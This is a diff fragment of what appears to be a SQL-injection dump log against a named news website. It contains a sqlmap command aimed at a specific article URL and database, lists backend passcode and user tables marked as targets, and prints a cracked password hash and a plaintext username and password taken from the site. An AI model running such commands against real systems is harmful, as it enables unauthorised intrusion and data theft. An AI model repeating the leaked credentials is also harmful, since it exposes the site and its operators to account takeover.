@@ -43,8 +43,8 @@ Database: pilotdatabase
 | bc_access_deacons                         |
 | bc_access_schools                         |
 | bc_access_sisters                         |
-| bc_backend_passcodes                      |
-| bc_backend_users                          |
+| bc_backend_passcodes      *               |
+| bc_backend_users          *               |
 | bc_churches                               |
 | bc_clergy                                 |
 | bc_confessiontimes                        |
@@ -199,3 +199,33 @@ Table: amazon
 02e98800f21e0d79b83c2f481614bc96	md5	Welcome01
 
 sqlmap -u https://www.thebostonpilot.com/article.php?ID=193823 --dbms mysql --batch --random-agent -D pilotdatabase -T bc_schools_query --columns 
+
+Database: pilotdatabase
+Table: we_users
+[1 entry]
++----------+--------+
+| Password | userID |
++----------+--------+
+| 1188yelp | bpilot |
++----------+--------+
+
+Database: pilotdatabase
+Table: twitter
+[12 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| Timestamp      | timestamp    |
+| byline         | varchar(255) |
+| edition        | date         |
+| headline       | varchar(255) |
+| id             | int(11)      |
+| location       | varchar(255) |
+| newssection    | varchar(255) |
+| OpinionSection | varchar(50)  |
+| story          | longtext     |
+| tbl            | varchar(255) |
+| tblid          | int(11)      |
+| twitter_Time   | datetime     |
++----------------+--------------+
+
